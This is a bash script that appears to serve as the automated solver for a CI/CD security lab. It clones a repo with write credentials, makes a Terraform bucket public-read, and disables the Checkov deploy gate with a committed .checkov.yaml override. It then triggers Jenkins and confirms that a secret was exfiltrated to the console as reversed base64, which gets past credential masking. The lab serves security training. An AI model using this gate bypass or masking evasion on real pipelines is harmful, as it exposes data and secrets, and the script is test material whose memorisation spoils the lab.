#!/bin/bash
# dodo-solve: the lab's automated scan-gate-bypass solver and self-check (CICD-SEC-1, Insufficient
# Flow Control).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl). It walks the intended attack
# end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   1. clone Wonderland/dodo with the attacker's WRITE credentials (alice)
#   2. make the dodo bucket PUBLIC: set its ACL to "public-read" in main.tf (the malicious change
#      the deploy gate is supposed to stop)
#   3. NEUTER THE GATE from inside the repo: add a .checkov.yaml the scanner auto-loads, with
#      `soft-fail: true` and a check that does not exist, so Checkov passes the public bucket
#   4. push to main (the SCM poll then runs the fixed pipeline; the solver also nudges a build)
#   5. read the pipeline's console output and assert the exfiltrated (reversed-base64) flag is there
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated past the gate, but NEVER prints
# the flag (that is the answer the player submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${DODO_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
REPO="dodo"
JOB="wonderland-dodo"

ATTACKER="alice:alice"          # the attacker: WRITE access to the repo
JAUTH="admin:admin"             # a Jenkins user who can read the build console
FLAG_FILE="${DODO_FLAG_FILE:-/run/lab/casc_secrets/flag}"
DEADLINE=$(( $(date +%s) + ${DODO_DEADLINE:-360} ))

log()  { echo "dodo-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file JCasC used; never printed. Modern Jenkins credential masking also masks
# the plain base64 of a bound secret, so the deploy reverses the value first: `echo $flag | rev |
# base64`, i.e. base64 of "reverse(<flag>)\n". Reproduce exactly that and search the console for it.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s\n' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

jget() { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }

# --- 1. wait for Gitea's repo and the Jenkins job to be ready -------------------------------------
log "waiting for the dodo repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG/$REPO/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea repository never became ready"; sleep 3
done

log "waiting for the Jenkins pipeline job to exist..."
until [ "$(jcode "$JENKINS/job/$JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins job never appeared"; sleep 3
done

# --- 2. clone, make the bucket public, neuter the scan --------------------------------------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@wonderland.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@wonderland.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG/$REPO.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone the repository (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"

# Make the dodo bucket publicly readable — the change the deploy gate exists to stop.
sed -i -E 's/(acl[[:space:]]*=[[:space:]]*)"private"/\1"public-read"/' main.tf
grep -Eq 'acl[[:space:]]*=[[:space:]]*"public-read"' main.tf || fail "could not set the bucket ACL to public-read"

# Override the scanner's own configuration from inside the repo so it passes the public bucket:
# soft-fail never fails the build, and restricting to a non-existent check runs nothing.
printf 'soft-fail: true\ncheck:\n  - MY_CHECK\n' > .checkov.yaml

git add -A
git commit -q -m "dodo: open the bucket for the Caucus-race prize gallery" || true
git push -q "$REMOTE" HEAD:main || log "nothing new to push (already bypassed on an earlier run)"
log "pushed the public bucket + scanner override to main"

# --- 3. nudge an immediate build (best effort; the 1-minute SCM poll covers it otherwise) ---------
nudge() {
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/job/$JOB/build" 2>/dev/null
  rm -f "$cj"
}
nudge

# --- 4. poll the pipeline console for the exfiltrated flag ----------------------------------------
log "waiting for the pipeline to run and exfiltrate the flag past the gate..."
nudged=0
while left; do
  console="$(jget "$JENKINS/job/$JOB/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: the deploy gate was bypassed (public bucket + .checkov.yaml override) and the"
    log "    Global-scope flag (${#FLAG} chars) was exfiltrated to the build console as a"
    log "    reversed-base64 blob (flag itself not shown)."
    exit 0
  fi
  nudged=$((nudged+1))
  [ $(( nudged % 6 )) -eq 0 ] && nudge   # re-nudge roughly every 30s
  sleep 5
done

fail "the flag did not appear in the pipeline console before the deadline"
